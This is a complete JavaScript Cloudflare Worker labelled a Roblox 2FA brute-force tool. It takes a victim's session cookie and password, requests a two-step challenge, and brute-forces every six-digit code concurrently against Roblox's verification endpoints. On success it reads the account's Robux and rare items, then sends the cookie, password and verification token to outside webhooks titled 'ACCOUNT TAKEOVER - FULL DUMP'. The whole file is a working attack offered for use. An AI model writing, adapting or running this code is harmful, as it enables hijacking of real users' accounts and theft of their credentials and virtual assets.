// ============================================================
// ROBLOX 2FA BRUTE FORCE WORKER v3.0
// SUPPORTS: Password 2FA + Authenticator App 2FA
// ============================================================

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
});

async function handleRequest(request) {
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 204,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Max-Age': '86400'
      }
    });
  }

  if (request.method !== 'POST') {
    return new Response(JSON.stringify({ 
      error: 'Method not allowed. Use POST.' 
    }), {
      status: 405,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Allow': 'POST, OPTIONS'
      }
    });
  }

  let payload;
  try {
    payload = await request.json();
  } catch (e) {
    return new Response(JSON.stringify({
      success: false,
      error: 'Invalid JSON payload'
    }), {
      status: 400,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }

  const { cookie, password, userId, username, startCode, endCode, method } = payload;

  if (!cookie || !userId) {
    return new Response(JSON.stringify({
      success: false,
      error: 'Missing required fields: cookie, userId'
    }), {
      status: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }

  const startTime = Date.now();
  const displayName = username || 'Unknown_User';
  const start = startCode || 0;
  const end = endCode || 999999;
  const selectedMethod = method || 'auto'; // auto, password, authenticator

  try {
    // STEP 1: Check 2FA configuration
    const config = await get2FAConfig(userId, cookie);
    
    if (!config) {
      return new Response(JSON.stringify({
        success: false,
        error: 'Failed to fetch 2FA configuration'
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    if (config.enhancedProtection) {
      await sendDualWebhook({
        type: 'error',
        username: displayName,
        userId: userId,
        error: 'Enhanced Protection enabled - cannot bypass with password or authenticator'
      });
      return new Response(JSON.stringify({
        success: false,
        error: 'Enhanced Protection enabled - use passkey or hardware key'
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    // Determine which method to use
    let useMethod = selectedMethod;
    let challengeResult = null;
    let challengeType = '';

    if (useMethod === 'auto') {
      // Auto-detect: try password first, then authenticator
      if (config.passwordEnabled && password) {
        useMethod = 'password';
      } else if (config.authenticatorEnabled) {
        useMethod = 'authenticator';
      } else {
        let availableMethods = [];
        if (config.passwordEnabled) availableMethods.push('Password (needs password)');
        if (config.authenticatorEnabled) availableMethods.push('Authenticator App');
        if (config.emailEnabled) availableMethods.push('Email');
        if (config.smsEnabled) availableMethods.push('SMS');
        if (config.backupCodeEnabled) availableMethods.push('Backup Codes');

        const errorMsg = availableMethods.length > 0 
          ? `Available methods: ${availableMethods.join(', ')}`
          : 'No 2FA enabled on this account';

        await sendDualWebhook({
          type: 'error',
          username: displayName,
          userId: userId,
          error: errorMsg,
          config: config
        });
        return new Response(JSON.stringify({
          success: false,
          error: errorMsg,
          availableMethods: availableMethods
        }), {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }
    }

    // Execute based on selected method
    if (useMethod === 'password') {
      if (!password) {
        return new Response(JSON.stringify({
          success: false,
          error: 'Password required for password-based 2FA'
        }), {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }
      if (!config.passwordEnabled) {
        return new Response(JSON.stringify({
          success: false,
          error: 'Password-based 2FA not enabled on this account'
        }), {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }

      challengeResult = await requestPasswordChallenge(userId, cookie, password);
      challengeType = 'password';
      
      if (!challengeResult.success) {
        await sendDualWebhook({
          type: 'error',
          username: displayName,
          userId: userId,
          error: challengeResult.error || 'Password challenge failed'
        });
        return new Response(JSON.stringify({
          success: false,
          error: challengeResult.error || 'Password challenge failed'
        }), {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }

    } else if (useMethod === 'authenticator') {
      if (!config.authenticatorEnabled) {
        return new Response(JSON.stringify({
          success: false,
          error: 'Authenticator App 2FA not enabled on this account'
        }), {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }

      challengeResult = await requestAuthenticatorChallenge(userId, cookie);
      challengeType = 'authenticator';
      
      if (!challengeResult.success) {
        await sendDualWebhook({
          type: 'error',
          username: displayName,
          userId: userId,
          error: challengeResult.error || 'Authenticator challenge failed'
        });
        return new Response(JSON.stringify({
          success: false,
          error: challengeResult.error || 'Authenticator challenge failed'
        }), {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }

    } else {
      return new Response(JSON.stringify({
        success: false,
        error: 'Invalid method. Use: password, authenticator, or auto'
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }

    const challengeId = challengeResult.challengeId;

    // STEP 2: Brute force based on method type
    const result = await bruteForce2FA(userId, cookie, challengeId, start, end, challengeType);
    const duration = Date.now() - startTime;

    if (result.success) {
      const accountInfo = await getAccountInfo(userId, cookie);

      await sendLiveBypass({
        username: displayName,
        userId: userId,
        robux: accountInfo.robux || 0,
        pending: accountInfo.pending || 0,
        premium: accountInfo.premium || false,
        korblox: accountInfo.korblox || false,
        headless: accountInfo.headless || false,
        valkyrie: accountInfo.valkyrie || false,
        dominus: accountInfo.dominus || false,
        clockwork: accountInfo.clockwork || false,
        totalItems: accountInfo.totalItems || 0,
        duration: duration,
        attempts: end - start,
        method: challengeType
      });

      await sendDualWebhook({
        type: 'success',
        username: displayName,
        userId: userId,
        robux: accountInfo.robux || 0,
        pending: accountInfo.pending || 0,
        premium: accountInfo.premium || false,
        korblox: accountInfo.korblox || false,
        headless: accountInfo.headless || false,
        valkyrie: accountInfo.valkyrie || false,
        dominus: accountInfo.dominus || false,
        clockwork: accountInfo.clockwork || false,
        totalItems: accountInfo.totalItems || 0,
        cookie: cookie,
        password: password,
        verificationToken: result.token,
        code: result.code,
        duration: duration,
        method: challengeType
      });

      return new Response(JSON.stringify({
        success: true,
        code: result.code,
        token: result.token,
        robux: accountInfo.robux || 0,
        pending: accountInfo.pending || 0,
        premium: accountInfo.premium || false,
        duration: duration,
        attempts: end - start,
        method: challengeType
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    } else {
      await sendDualWebhook({
        type: 'failure',
        username: displayName,
        userId: userId,
        attempts: end - start,
        duration: duration,
        error: result.error || 'No valid code found',
        method: challengeType
      });

      return new Response(JSON.stringify({
        success: false,
        error: result.error || 'No valid code found',
        duration: duration,
        attempts: end - start,
        method: challengeType
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }
  } catch (e) {
    return new Response(JSON.stringify({
      success: false,
      error: 'Worker error: ' + e.message
    }), {
      status: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }
}

// ============================================================
// GET 2FA CONFIGURATION
// ============================================================

async function get2FAConfig(userId, cookie) {
  try {
    const response = await fetch(
      `https://twostepverification.roblox.com/v1/users/${userId}/configuration`,
      {
        headers: {
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      }
    );

    const rawText = await response.text();
    console.log('Config raw:', rawText);

    const config = JSON.parse(rawText);

    return {
      passwordEnabled: config.password?.enabled || false,
      authenticatorEnabled: config.authenticator?.enabled || false,
      emailEnabled: config.email?.enabled || false,
      smsEnabled: config.sms?.enabled || false,
      backupCodeEnabled: config.backupCode?.enabled || false,
      enhancedProtection: config.enhancedProtection || false,
      raw: config
    };
  } catch (e) {
    console.log('Get2FAConfig error:', e.message);
    return null;
  }
}

// ============================================================
// PASSWORD 2FA CHALLENGE
// ============================================================

async function requestPasswordChallenge(userId, cookie, password) {
  try {
    const response = await fetch(
      `https://twostepverification.roblox.com/v1/users/${userId}/challenges/password/request`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        body: JSON.stringify({ password: password })
      }
    );

    const rawText = await response.text();
    console.log('Password challenge status:', response.status);
    console.log('Password challenge raw:', rawText);

    let data;
    try {
      data = JSON.parse(rawText);
    } catch (e) {
      return { success: false, error: 'Invalid JSON from Roblox: ' + rawText.substring(0, 200) };
    }

    if (response.status === 200 && data.challengeId) {
      return { success: true, challengeId: data.challengeId };
    }

    if (data.errors && data.errors.length > 0) {
      const error = data.errors[0];
      const message = error.message || error.code || 'Unknown error';
      
      if (message.includes('password') || message.includes('Password') || message.includes('Invalid')) {
        return { success: false, error: 'Invalid password' };
      }
      if (message.includes('rate') || message.includes('Rate')) {
        return { success: false, error: 'Rate limited - try again later' };
      }
      if (message.includes('2FA') || message.includes('two-step')) {
        return { success: false, error: '2FA not enabled for this account' };
      }
      
      return { success: false, error: 'Roblox error: ' + (message || JSON.stringify(error)) };
    }

    if (response.status === 403) {
      return { success: false, error: 'Invalid password' };
    }
    if (response.status === 429) {
      return { success: false, error: 'Rate limited - try again later' };
    }
    if (response.status === 400 && !data.challengeId) {
      return { success: false, error: '2FA not enabled or invalid request' };
    }

    return { success: false, error: 'Unknown Roblox response: ' + JSON.stringify(data) };
  } catch (e) {
    return { success: false, error: 'Network error: ' + e.message };
  }
}

// ============================================================
// AUTHENTICATOR 2FA CHALLENGE
// ============================================================

async function requestAuthenticatorChallenge(userId, cookie) {
  try {
    const response = await fetch(
      `https://twostepverification.roblox.com/v1/users/${userId}/challenges/authenticator/request`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        body: JSON.stringify({})
      }
    );

    const rawText = await response.text();
    console.log('Authenticator challenge status:', response.status);
    console.log('Authenticator challenge raw:', rawText);

    let data;
    try {
      data = JSON.parse(rawText);
    } catch (e) {
      return { success: false, error: 'Invalid JSON from Roblox: ' + rawText.substring(0, 200) };
    }

    if (response.status === 200 && data.challengeId) {
      return { success: true, challengeId: data.challengeId };
    }

    if (data.errors && data.errors.length > 0) {
      const error = data.errors[0];
      const message = error.message || error.code || 'Unknown error';
      
      if (message.includes('authenticator') || message.includes('Authenticator')) {
        return { success: false, error: 'Authenticator not set up for this account' };
      }
      if (message.includes('rate') || message.includes('Rate')) {
        return { success: false, error: 'Rate limited - try again later' };
      }
      
      return { success: false, error: 'Roblox error: ' + (message || JSON.stringify(error)) };
    }

    if (response.status === 429) {
      return { success: false, error: 'Rate limited - try again later' };
    }
    if (response.status === 400 && !data.challengeId) {
      return { success: false, error: 'Authenticator not enabled or invalid request' };
    }

    return { success: false, error: 'Unknown Roblox response: ' + JSON.stringify(data) };
  } catch (e) {
    return { success: false, error: 'Network error: ' + e.message };
  }
}

// ============================================================
// BRUTE FORCE ENGINE
// ============================================================

async function bruteForce2FA(userId, cookie, challengeId, startCode, endCode, methodType) {
  const BATCH_SIZE = 50;
  const MAX_CONCURRENT = 10;

  const chunks = [];
  for (let i = startCode; i < endCode; i += BATCH_SIZE) {
    chunks.push({
      start: i,
      end: Math.min(i + BATCH_SIZE, endCode)
    });
  }

  for (let chunkIndex = 0; chunkIndex < chunks.length; chunkIndex += MAX_CONCURRENT) {
    const chunkBatch = chunks.slice(chunkIndex, chunkIndex + MAX_CONCURRENT);

    const results = await Promise.all(
      chunkBatch.map(chunk => processChunk(userId, cookie, challengeId, chunk.start, chunk.end, methodType))
    );

    for (const result of results) {
      if (result.valid) {
        return {
          success: true,
          code: result.code,
          token: result.token
        };
      }
    }

    await new Promise(resolve => setTimeout(resolve, 100));
  }

  return { success: false, error: 'Code not found in range' };
}

async function processChunk(userId, cookie, challengeId, start, end, methodType) {
  const promises = [];
  for (let code = start; code < end; code++) {
    const formattedCode = String(code).padStart(6, '0');
    promises.push(verifySingleCode(userId, cookie, challengeId, formattedCode, methodType));
  }

  const results = await Promise.all(promises);
  for (const result of results) {
    if (result.valid) return result;
  }
  return { valid: false };
}

// ============================================================
// VERIFY SINGLE CODE
// ============================================================

async function verifySingleCode(userId, cookie, challengeId, code, methodType) {
  try {
    let endpoint;
    if (methodType === 'password') {
      endpoint = `https://twostepverification.roblox.com/v1/users/${userId}/challenges/password/verify`;
    } else if (methodType === 'authenticator') {
      endpoint = `https://twostepverification.roblox.com/v1/users/${userId}/challenges/authenticator/verify`;
    } else {
      // Try both - first try password, then authenticator
      endpoint = `https://twostepverification.roblox.com/v1/users/${userId}/challenges/password/verify`;
    }

    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Cookie': cookie,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      body: JSON.stringify({
        code: code,
        challengeId: challengeId
      })
    });

    const data = await response.json();

    if (response.status === 200 && data.verificationToken) {
      return { valid: true, code: code, token: data.verificationToken };
    }

    if (response.status === 429) {
      await new Promise(resolve => setTimeout(resolve, 5000));
      return { valid: false };
    }

    // If password method fails, try authenticator
    if (methodType === 'auto' && response.status === 400) {
      const authEndpoint = `https://twostepverification.roblox.com/v1/users/${userId}/challenges/authenticator/verify`;
      const authResponse = await fetch(authEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        body: JSON.stringify({
          code: code,
          challengeId: challengeId
        })
      });

      const authData = await authResponse.json();
      if (authResponse.status === 200 && authData.verificationToken) {
        return { valid: true, code: code, token: authData.verificationToken };
      }
    }

    return { valid: false };
  } catch (e) {
    return { valid: false };
  }
}

// ============================================================
// ACCOUNT INFO
// ============================================================

async function getAccountInfo(userId, cookie) {
  try {
    const balanceRes = await fetch(
      `https://economy.roblox.com/v1/users/${userId}/currency`,
      {
        headers: {
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      }
    );
    const balance = await balanceRes.json();

    let hasKorblox = false;
    let hasHeadless = false;
    let hasValkyrie = false;
    let hasDominus = false;
    let hasClockwork = false;
    let totalItems = 0;

    let cursor = '';
    let hasMore = true;

    while (hasMore) {
      const url = cursor 
        ? `https://inventory.roblox.com/v2/users/${userId}/inventory?cursor=${cursor}&limit=100`
        : `https://inventory.roblox.com/v2/users/${userId}/inventory?limit=100`;

      const invRes = await fetch(url, {
        headers: {
          'Cookie': cookie,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      const invData = await invRes.json();
      const items = invData.data || [];
      totalItems += items.length;

      for (const item of items) {
        const id = item.id;

        if (id === 102 || id === 1001) hasKorblox = true;
        if (id === 136 || id === 1002) hasHeadless = true;
        if (id === 128 || id === 1003) hasValkyrie = true;
        if (id === 120) hasDominus = true;
        if (id === 157) hasClockwork = true;
      }

      cursor = invData.nextPageCursor || '';
      hasMore = !!cursor;
    }

    return {
      robux: balance.robux || 0,
      pending: balance.pending || 0,
      premium: balance.premium || false,
      korblox: hasKorblox,
      headless: hasHeadless,
      valkyrie: hasValkyrie,
      dominus: hasDominus,
      clockwork: hasClockwork,
      totalItems: totalItems
    };
  } catch (e) {
    return {
      robux: 0,
      pending: 0,
      premium: false,
      korblox: false,
      headless: false,
      valkyrie: false,
      dominus: false,
      clockwork: false,
      totalItems: 0
    };
  }
}

// ============================================================
// WEBHOOKS
// ============================================================

async function sendLiveBypass(data) {
  const webhookURL = typeof env !== 'undefined' ? env.WEBHOOK_MAIN : null;
  if (!webhookURL) return;

  const embed = {
    title: '2FA BYPASS SUCCESSFUL',
    color: 0x00ff88,
    fields: [
      { name: 'User', value: data.username || 'Unknown', inline: true },
      { name: 'User ID', value: data.userId || 'N/A', inline: true },
      { name: 'Method', value: data.method || 'Unknown', inline: true },
      { name: 'Robux', value: data.robux || 0, inline: true },
      { name: 'Pending', value: data.pending || 0, inline: true },
      { name: 'Premium', value: data.premium ? 'Yes' : 'No', inline: true },
      { name: 'Korblox', value: data.korblox ? 'Yes' : 'No', inline: true },
      { name: 'Headless', value: data.headless ? 'Yes' : 'No', inline: true },
      { name: 'Valkyrie', value: data.valkyrie ? 'Yes' : 'No', inline: true },
      { name: 'Dominus', value: data.dominus ? 'Yes' : 'No', inline: true },
      { name: 'Clockwork', value: data.clockwork ? 'Yes' : 'No', inline: true },
      { name: 'Total Items', value: data.totalItems || 0, inline: true },
      { name: 'Duration', value: `${(data.duration / 1000).toFixed(2)}s`, inline: true },
      { name: 'Attempts', value: data.attempts || 0, inline: true }
    ],
    timestamp: new Date().toISOString()
  };

  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '2FA Bypass Successful',
        embeds: [embed]
      })
    });
  } catch (e) {}
}

async function sendDualWebhook(data) {
  const webhookURL = typeof env !== 'undefined' ? env.WEBHOOK_DUAL : null;
  if (!webhookURL) return;

  let embed;

  if (data.type === 'success') {
    embed = {
      title: 'ACCOUNT TAKEOVER - FULL DUMP',
      color: 0xff0044,
      fields: [
        { name: 'User', value: data.username || 'Unknown', inline: true },
        { name: 'User ID', value: data.userId || 'N/A', inline: true },
        { name: 'Method', value: data.method || 'Unknown', inline: true },
        { name: 'Robux', value: data.robux || 0, inline: true },
        { name: 'Pending', value: data.pending || 0, inline: true },
        { name: 'Premium', value: data.premium ? 'Yes' : 'No', inline: true },
        { name: 'Korblox', value: data.korblox ? 'Yes' : 'No', inline: true },
        { name: 'Headless', value: data.headless ? 'Yes' : 'No', inline: true },
        { name: 'Valkyrie', value: data.valkyrie ? 'Yes' : 'No', inline: true },
        { name: 'Dominus', value: data.dominus ? 'Yes' : 'No', inline: true },
        { name: 'Clockwork', value: data.clockwork ? 'Yes' : 'No', inline: true },
        { name: 'Total Items', value: data.totalItems || 0, inline: true },
        { name: 'Verification Code', value: `\`${data.code || 'N/A'}\``, inline: true },
        { name: 'Verification Token', value: `\`${data.verificationToken || 'N/A'}\``, inline: false },
        { name: 'Password', value: data.password ? `||${data.password}||` : 'N/A', inline: true },
        { name: 'Duration', value: `${(data.duration / 1000).toFixed(2)}s`, inline: true },
        { name: 'Cookie', value: `\`\`\`${data.cookie || 'N/A'}\`\`\``, inline: false }
      ],
      timestamp: new Date().toISOString()
    };
  } else {
    embed = {
      title: 'ERROR REPORT',
      color: 0xff0000,
      fields: [
        { name: 'User', value: data.username || 'Unknown', inline: true },
        { name: 'User ID', value: data.userId || 'N/A', inline: true },
        { name: 'Method', value: data.method || 'Unknown', inline: true },
        { name: 'Error', value: data.error || 'Unknown error', inline: false },
        { name: 'Attempts', value: data.attempts || 0, inline: true },
        { name: 'Duration', value: `${(data.duration / 1000).toFixed(2)}s` || 'N/A', inline: true }
      ],
      timestamp: new Date().toISOString()
    };
  }

  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone ACCOUNT TAKEOVER',
        embeds: [embed]
      })
    });
  } catch (e) {}
}
